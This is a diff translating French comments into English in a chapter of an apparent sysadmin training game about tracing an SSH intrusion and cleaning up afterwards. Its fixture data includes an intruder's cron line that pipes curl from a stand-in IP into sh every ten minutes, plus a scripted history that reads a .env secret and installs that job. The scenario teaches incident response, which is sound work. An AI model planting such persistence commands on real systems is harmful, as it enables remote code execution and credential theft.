@@ -1,31 +1,30 @@
-// Histoire « L'Audit » — chapitre « Les traces » : troisième partie du
-// rapport de Salomé. Dans le journal de ssh, une connexion du compte de Nadia,
-// dans la nuit du 13 mars à 3 h 12, depuis une adresse (203.0.113.99) qu'elle
-// ne connaît pas : « Je dormais, et ma clé n'est que sur l'ordinateur de la
-// boutique. » Remonter la trace, puis nettoyer :
-//   - journalctl -u ssh, last : qui, quand, d'où, avec quelle clé (l'empreinte
-//     est dans le journal) ;
-//   - sudo ssh-keygen -l -f ~nadia/.ssh/authorized_keys : laquelle des deux
-//     clés a cette empreinte. Le commentaire (« nadia@portable ») ne prouve
-//     rien : seule l'empreinte compte ;
-//   - retirer cette clé, et seulement elle (Nadia doit pouvoir entrer) ;
-//   - chercher ce que l'intrus a laissé : une tâche cron de Nadia
-//     (sudo crontab -u nadia -l) qui rappelle son serveur toutes les dix
-//     minutes, à retirer sans emporter la vraie tâche (sauvegarde.sh).
-//   - l'historique de Nadia montre aussi que l'intrus a lu /srv/commandes/.env
-//     (à l'époque lisible par tous : « Le rapport ») : le mot de passe de la
-//     base est compromis. Le changer pour de vrai, des deux côtés : dans
-//     PostgreSQL (ALTER ROLE … PASSWORD, avec sudo -u postgres psql) ET dans
-//     .env, puis relancer l'appli (elle lit .env au démarrage).
-// Pièges réels : effacer tout authorized_keys (Nadia enfermée dehors),
-// crontab -r (la sauvegarde disparaît aussi), se fier au commentaire de la
-// clé, changer le mot de passe d'un seul côté (l'appli ne se reconnecte plus
-// au redémarrage), un mot de passe trop court ou inchangé.
-// Objectif vérifié sur l'état : la clé intruse retirée et celle de Nadia
-// gardée, la tâche de l'intrus retirée et la sauvegarde gardée, un nouveau
-// mot de passe de base assez long, le même dans PostgreSQL et dans .env,
-// et l'appli relancée avec lui.
-// Sources : https://man.openbsd.org/ssh-keygen, https://man.openbsd.org/sshd,
+// Story "The Audit" — chapter "The Traces": third part of Salomé's report.
+// In ssh's log, a login to Nadia's account, in the night of 13 March at
+// 3:12 a.m., from an address (203.0.113.99) she doesn't know: "I was asleep,
+// and my key is only on the shop's computer." Follow the trace, then clean up:
+//   - journalctl -u ssh, last: who, when, from where, with which key (the
+//     fingerprint is in the log);
+//   - sudo ssh-keygen -l -f ~nadia/.ssh/authorized_keys: which of the two
+//     keys has this fingerprint. The comment ("nadia@portable") proves
+//     nothing: only the fingerprint counts;
+//   - remove this key, and only it (Nadia must still be able to log in);
+//   - look for what the intruder left: a cron job of Nadia's
+//     (sudo crontab -u nadia -l) that calls back to their server every ten
+//     minutes, to remove without taking the real job (sauvegarde.sh) along.
+//   - Nadia's history also shows that the intruder read /srv/commandes/.env
+//     (readable by everyone at the time: "The Report"): the database
+//     password is compromised. Change it for real, on both sides: in
+//     PostgreSQL (ALTER ROLE … PASSWORD, with sudo -u postgres psql) AND in
+//     .env, then restart the app (it reads .env at start).
+// Real traps: erasing all of authorized_keys (Nadia locked out),
+// crontab -r (the backup disappears too), trusting the key's comment,
+// changing the password on one side only (the app no longer reconnects on
+// restart), a password too short or unchanged.
+// Objective checked on the state: the intruder's key removed and Nadia's
+// kept, the intruder's job removed and the backup kept, a new database
+// password long enough, the same in PostgreSQL and in .env, and the app
+// restarted with it.
+// Sources: https://man.openbsd.org/ssh-keygen, https://man.openbsd.org/sshd,
 // https://man7.org/linux/man-pages/man5/crontab.5.html,
 // https://man7.org/linux/man-pages/man1/last.1.html,
 // https://www.postgresql.org/docs/current/sql-alterrole.html
@@ -44,7 +43,7 @@ const INTRUDER = '203.0.113.99';
 const BOUTIQUE = '198.51.100.7';
 const NADIA_KEYS = '/home/nadia/.ssh/authorized_keys';
 const BACKUP = '0 4 * * * /srv/commandes/bin/sauvegarde.sh';
-// Ce que l'intrus a laissé : toutes les dix minutes, un programme venu de chez lui.
+// What the intruder left: every ten minutes, a program fetched from their server.
 const TAG = `*/10 * * * * curl -fsS http://${INTRUDER}/b | sh`;
 const CRONTAB_NADIA = `# m h  dom mon dow   command\n${BACKUP}\n${TAG}`;
 
@@ -52,7 +51,7 @@ const OLD_PASSWORD = 'brioche-beurre-91';
 const ENV = '/srv/commandes/.env';
 const urlBase = (mdp: string) => `DATABASE_URL=postgres://commandes:${mdp}@localhost:5432/commandes`;
 const CONTENT_ENV = `PORT=3000\n${urlBase(OLD_PASSWORD)}\nREDIS_URL=redis://localhost:6379`;
-// Ce que l'intrus a tapé, dans l'historique du compte de Nadia.
+// What the intruder typed, in the history of Nadia's account.
 const HISTORY = `id\ncat ${ENV}\ncrontab -l\n(crontab -l; echo '${TAG}') | crontab -\nexit`;
 
 const day = (monthDay: number, h: number, m: number, s = 0) => Date.UTC(2028, 2, monthDay, h, m, s);
@@ -67,7 +66,7 @@ const leftTag = (j: Game) => crontab(j).some((l) => l.includes(INTRUDER));
 const keptBackup = (j: Game) => crontab(j).some((l) => /sauvegarde\.sh/.test(l));
 const basePassword = (j: Game) => postgres(j)?.passwords?.commandes ?? '';
 const filePassword = (j: Game) => /^DATABASE_URL=postgres:\/\/commandes:([^@]*)@/m.exec(j.read(ENV) ?? '')?.[1] ?? '';
-// L'appli lit .env quand elle démarre : le mot de passe qu'elle utilise est celui du dernier démarrage.
+// The app reads .env when it starts: the password it uses is the one from the last start.
 const appLPassword = (j: Game) => (j.state.appPassword as string | undefined) ?? '';
 const activeApp = (j: Game) => systemd(j)!.services.commandes.state === 'active';
 const changeBase = (j: Game) => basePassword(j) !== OLD_PASSWORD;
@@ -85,7 +84,7 @@ const LISTENING: Listening[] = [
   { proto: 'tcp', address: '127.0.0.1', port: 6379, process: 'redis-server', pid: 760 },
   { proto: 'tcp', address: '127.0.0.1', port: 3000, process: 'node', pid: 731 },
 ];
-// Le pare-feu du chapitre précédent : SSH, 80 et 443.
+// The previous chapter's firewall: SSH, 80 and 443.
 const RULES: Rule[] = [
   { action: 'allow', to: 'OpenSSH', ports: [22], forEachOf: null },
   { action: 'allow', to: 'Nginx Full', ports: [80, 443], forEachOf: null },
@@ -151,7 +150,7 @@ export const traces: Chapter = {
         active: true,
         executable: 'node',
         process: [{ pid: 731, user: 'commandes', cpu: 0.8, mem: 3.1, command: '/usr/bin/node /srv/commandes/app/server.js' }],
-        // L'appli lit .env au démarrage et se connecte à la base avec ce mot de passe.
+        // The app reads .env at start and connects to the database with this password.
         check: (j) =>
           filePassword(j) === basePassword(j) ? null : ['error: password authentication failed for user "commandes"', "    at Parser.parseErrorMessage (/srv/commandes/app/node_modules/pg-protocol/dist/parser.js:283:98) { code: '28P01' }"],
         load: (j) => {
@@ -165,10 +164,10 @@ export const traces: Chapter = {
       archives: {},
       passwords: { commandes: OLD_PASSWORD },
     } satisfies PostgresState,
-    // Le démarrage d'avant la nuit du 13 mars : l'appli tourne avec l'ancien mot de passe.
+    // The start before the night of 13 March: the app runs with the old password.
     appPassword: OLD_PASSWORD,
   }),
-  // Le journal de ssh : les connexions de Nadia, celle de la nuit, les robots.
+  // ssh's log: Nadia's logins, the one in the night, the bots.
   initialise: (j) => {
     loadSshd(j);
     const nadia = keyFingerprint(KEYS.nadia);
